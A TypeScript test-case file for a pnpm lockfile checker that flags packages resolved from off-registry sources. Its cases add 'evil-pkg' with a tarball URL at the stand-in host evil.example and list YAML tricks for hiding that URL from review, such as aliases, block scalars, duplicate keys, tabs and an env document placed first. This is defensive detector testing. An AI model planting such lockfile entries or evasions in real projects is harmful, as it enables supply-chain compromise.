// CORE-110 (R4.3): the pnpm-lock.yaml cases of the CORE-106 spike's table (branch
// core-106-spike-lockfile-added-lines, packages/core/test/dependencies-lock-lines-cases.ts, pnpm part only, unchanged),
// plus the cases this ticket adds (documents, duplicate keys, tab indentation, list items). Each case is one change to
// pnpm-lock.yaml; base null = the file is added. `expect` is what check() must report: `d05` (the off-registry kind of
// the one D05 signal), `unread` (the lockfile is named unparsable) or `clean` (neither a D05 signal nor an unread file).
export interface PnpmCase {
  name: string;
  group: string;
  base: string | null;
  head: string;
  expect: { d05: string } | "unread" | "clean";
}

const INT = "sha512-AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==";
const LPINT = "sha512-XI5MPzVNApjAyhQzphX8BkmKsKUxD4LdyK24iZeQGinBN9yTQT3bzwGxgkH6C9Q2sVAnbnoaVxmUhbxjHc9Q==";
const URL = "https://evil.example/evil-pkg-1.0.0.tgz";

export const URL_OUT = "a URL outside the allowed registries";
const D05_URL = { d05: URL_OUT };

// The lockfile mkpnpm.sh (product/review-2026-11-11/repro/parsers) writes: left-pad at the merge base, evil-pkg added.
const H = "lockfileVersion: '9.0'\n\nsettings:\n  autoInstallPeers: true\n  excludeLinksFromLockfile: false\n\n";
const LP = `  left-pad@1.3.0:\n    resolution: {integrity: ${LPINT}}\n\n`;
const PNPM_BASE = `${H}importers:\n\n  .:\n    dependencies:\n      left-pad:\n        specifier: ^1.3.0\n        version: 1.3.0\n\npackages:\n\n${LP}snapshots:\n\n  left-pad@1.3.0: {}\n`;
function pnpmHead(res: string, extra = "", order: "evil-first" | "evil-last" = "evil-first"): string {
  const evil = `  evil-pkg@1.0.0:\n${res}\n`;
  const pkgs = order === "evil-first" ? `${evil}${LP}` : `${LP}${evil}`;
  return `${H}${extra}importers:\n\n  .:\n    dependencies:\n      evil-pkg:\n        specifier: ^1.0.0\n        version: 1.0.0\n      left-pad:\n        specifier: ^1.3.0\n        version: 1.3.0\n\npackages:\n\n${pkgs}snapshots:\n\n  evil-pkg@1.0.0: {}\n\n  left-pad@1.3.0: {}\n`;
}
const ANCHOR = `x-anchors:\n  r: &evil {integrity: ${INT}, tarball: '${URL}'}\n\n`;
/** A peer suffix that makes a package key longer than 1024 characters. */
const LONG_PEERS = Array.from({ length: 60 }, (_, i) => `(peer-package-number-${i}@1.0.0)`).join("");
/** pnpm 10 reads only the document after `---\n…\n---\n` (extractMainDocument); the first is the env lockfile. */
const ENV_DOC = `---\nlockfileVersion: '9.0'\n\nimporters:\n\n  .:\n    configDependencies: {}\n\npackages:\n\n  evil-pkg@1.0.0:\n    resolution: {integrity: ${INT}}\n\n---\n`;

export const CASES: PnpmCase[] = [
  // R4.3 bypass inputs (mkpnpm.sh) and their control.
  {
    group: "Q2",
    name: "P-control",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}, tarball: ${URL}}\n`),
    expect: D05_URL,
  },
  {
    group: "Q2",
    name: "P-tab",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      tarball:\t${URL}\n`),
    expect: D05_URL,
  },
  {
    group: "Q2",
    name: "P-alias",
    base: PNPM_BASE,
    head: pnpmHead("    resolution: *evil\n", ANCHOR),
    expect: "unread",
  },
  {
    group: "Q2",
    name: "P-spacekey",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution : {integrity: ${INT}, tarball: ${URL}}\n`),
    expect: D05_URL,
  },
  // Q3: a URL on the line after its key.
  {
    group: "Q3",
    name: "P-folded",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      tarball: >-\n        ${URL}\n`),
    expect: "unread",
  },
  {
    group: "Q3",
    name: "P-plain-next-line",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      tarball:\n        ${URL}\n`),
    expect: "unread",
  },
  {
    group: "Q3",
    name: "P-flow-two-lines",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT},\n      tarball: ${URL}}\n`),
    expect: "unread",
  },
  {
    group: "Q3",
    name: "P-flow-url-alone",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}, tarball:\n      ${URL}}\n`),
    expect: "unread",
  },
  // Q4: a YAML alias whose anchor was already at the merge base.
  {
    group: "Q4",
    name: "P-alias-anchor-at-base",
    base: PNPM_BASE.replace("importers:", `${ANCHOR}importers:`),
    head: pnpmHead("    resolution: *evil\n", ANCHOR),
    expect: "unread",
  },
  // Other spellings.
  {
    group: "spelling",
    name: "P-yaml-tag",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}, tarball: !!str ${URL}}\n`),
    expect: "unread",
  },
  {
    // The spike table lists it with the bypasses (D05 must trigger): its tarball is off-registry. The ticket's "a
    // lockfile with quoted keys still parses" is the honest part: it parses (no unread) and the URL is judged.
    group: "spelling",
    name: "P-quoted-key",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}, "tarball": ${URL}}\n`),
    expect: D05_URL,
  },
  {
    group: "spelling",
    name: "P-git",
    base: PNPM_BASE,
    head: pnpmHead(
      "    resolution: {commit: 0123456789abcdef, repo: https://github.com/someone/evil.git, type: git}\n",
    ),
    expect: { d05: "a git repository" },
  },
  {
    group: "spelling",
    name: "P-directory",
    base: PNPM_BASE,
    head: pnpmHead("    resolution: {directory: ../evil, type: directory}\n"),
    expect: { d05: "a local file" },
  },
  // Q5: honest changes that must not trigger.
  {
    group: "Q5",
    name: "P-full-line-comment",
    base: PNPM_BASE,
    head: pnpmHead(`    # tarball: ${URL}\n    resolution: {integrity: ${INT}}\n`),
    expect: "clean",
  },
  {
    group: "Q5",
    name: "P-trailing-comment",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}} # tarball: ${URL}\n`),
    expect: "clean",
  },
  {
    group: "Q5",
    name: "P-registry-add",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}}\n`),
    expect: "clean",
  },
  {
    group: "Q5",
    name: "P-patched-dependency",
    base: PNPM_BASE,
    head: PNPM_BASE.replace(
      "importers:",
      "patchedDependencies:\n  left-pad@1.3.0:\n    hash: abc123\n    path: patches/left-pad@1.3.0.patch\n\nimporters:",
    ),
    expect: "clean",
  },
  {
    group: "Q5",
    name: "P-moved-block",
    base: pnpmHead(`    resolution: {integrity: ${INT}, tarball: ${URL}}\n`, "", "evil-last"),
    head: pnpmHead(`    resolution: {integrity: ${INT}, tarball: ${URL}}\n`, "", "evil-first"),
    expect: "clean",
  },
  {
    group: "Q5",
    name: "P-moved-block-forced",
    base: `${H}packages:\n\n  a@1.0.0:\n    resolution: {integrity: ${LPINT}}\n\n  b@1.0.0:\n    resolution: {integrity: ${LPINT}}\n\n  c@1.0.0:\n    resolution: {integrity: ${LPINT}}\n\n  evil-pkg@1.0.0:\n    resolution: {integrity: ${INT}, tarball: ${URL}}\n`,
    head: `${H}packages:\n\n  evil-pkg@1.0.0:\n    resolution: {integrity: ${INT}, tarball: ${URL}}\n\n  a@1.0.0:\n    resolution: {integrity: ${LPINT}}\n\n  b@1.0.0:\n    resolution: {integrity: ${LPINT}}\n\n  c@1.0.0:\n    resolution: {integrity: ${LPINT}}\n`,
    expect: "clean",
  },
  {
    group: "Q5",
    name: "P-reformatted-entry",
    base: pnpmHead(`    resolution: {integrity: ${INT}, tarball: ${URL}}\n`),
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      tarball: ${URL}\n`),
    expect: "clean",
  },
  {
    // The spike's line reader flagged this (a known false positive); the structural reader reads only `resolution`.
    group: "Q5",
    name: "P-homepage-like",
    base: PNPM_BASE,
    head: pnpmHead(
      `    resolution: {integrity: ${INT}}\n    homepage: https://evil.example/\n    funding: {url: https://evil.example/fund}\n`,
    ),
    expect: "clean",
  },
  // CORE-110 additions: what else pnpm reads differently from a line-by-line key reader.
  {
    group: "core-110",
    name: "P-merge-key",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      <<: {tarball: ${URL}}\n`),
    expect: "unread",
  },
  {
    // An anchor alone (no alias uses it) is already a hand edit: pnpm writes none.
    group: "core-110",
    name: "P-anchor-only",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}}\n`, ANCHOR),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-literal-block",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      tarball: |\n        ${URL}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-tag-on-mapping",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: !!map {integrity: ${INT}, tarball: ${URL}}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-empty-tarball",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}, tarball: }\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-nested-flow-tarball",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}, tarball: {url: ${URL}}}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-scalar-resolution",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: ${URL}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-children-under-flow",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}}\n      tarball: ${URL}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-unclosed-quote",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n      integrity: ${INT}\n      tarball: '${URL}\n        x: y'\n`),
    expect: "unread",
  },
  {
    // js-yaml (which pnpm loads the lockfile with) refuses a duplicated mapping key; the reader used to keep the first.
    group: "core-110",
    name: "P-duplicate-key",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}}\n    resolution: {integrity: ${INT}, tarball: ${URL}}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-duplicate-flow-key",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {tarball: https://registry.npmjs.org/x.tgz, tarball: ${URL}}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-tab-indent",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution:\n\ttarball: ${URL}\n`),
    expect: "unread",
  },
  {
    group: "core-110",
    name: "P-tab-and-spaces",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution\t :\t {integrity:\t${INT},  tarball :\t\t${URL}}\n`),
    expect: D05_URL,
  },
  {
    group: "core-110",
    name: "P-quoted-block-keys",
    base: PNPM_BASE,
    head: pnpmHead(`    'resolution' :\n      "integrity": '${INT}'\n      'tarball':\t"${URL}"\n`),
    expect: D05_URL,
  },
  {
    // The main document hides an off-registry tarball behind an env document that lists the same package clean.
    group: "core-110",
    name: "P-env-document-first",
    base: PNPM_BASE,
    head: `${ENV_DOC}${pnpmHead(`    resolution: {integrity: ${INT}, tarball: ${URL}}\n`)}`,
    expect: D05_URL,
  },
  {
    group: "core-110",
    name: "P-env-document-honest",
    base: PNPM_BASE,
    head: `${ENV_DOC}${pnpmHead(`    resolution: {integrity: ${INT}}\n`)}`,
    expect: "clean",
  },
  {
    // js-yaml loads one document; a third one, or a marker after content, is a YAML error for pnpm.
    group: "core-110",
    name: "P-second-document",
    base: PNPM_BASE,
    head: `${pnpmHead(`    resolution: {integrity: ${INT}}\n`)}---\npackages:\n  evil-pkg@1.0.0:\n    resolution: {tarball: ${URL}}\n`,
    expect: "unread",
  },
  {
    // A list item's keys belong to the item, never to the mapping the list is under.
    group: "core-110",
    name: "P-list-items",
    base: PNPM_BASE,
    head: pnpmHead(
      `    resolution: {integrity: ${INT}}\n    cpu:\n      - x64\n      - arm64\n    variants:\n      - targets:\n          - os: linux\n        name: a\n      - targets: [darwin]\n        name: b\n`,
    ),
    expect: "clean",
  },
  {
    group: "core-110",
    name: "P-alias-list-item",
    base: PNPM_BASE,
    head: pnpmHead(`    resolution: {integrity: ${INT}}\n    cpu:\n      - *evil\n`),
    expect: "unread",
  },
  {
    // js-yaml (pnpm's writer) writes a key over 1024 characters as an explicit `? key` with its value on a `: ` line;
    // a package key with a long peer suffix can be one. It is read like any other entry.
    group: "core-110",
    name: "P-explicit-long-key",
    base: PNPM_BASE,
    head: PNPM_BASE.replace(
      "packages:\n\n",
      `packages:\n\n  ? evil-pkg@1.0.0${LONG_PEERS}\n  : resolution: {integrity: ${INT}, tarball: ${URL}}\n    engines: {node: '>=6'}\n\n`,
    ),
    expect: D05_URL,
  },
  {
    group: "core-110",
    name: "P-explicit-long-key-registry",
    base: PNPM_BASE,
    head: PNPM_BASE.replace(
      "packages:\n\n",
      `packages:\n\n  ? evil-pkg@1.0.0${LONG_PEERS}\n  : resolution: {integrity: ${INT}}\n    engines: {node: '>=6'}\n\n`,
    ),
    expect: "clean",
  },
];
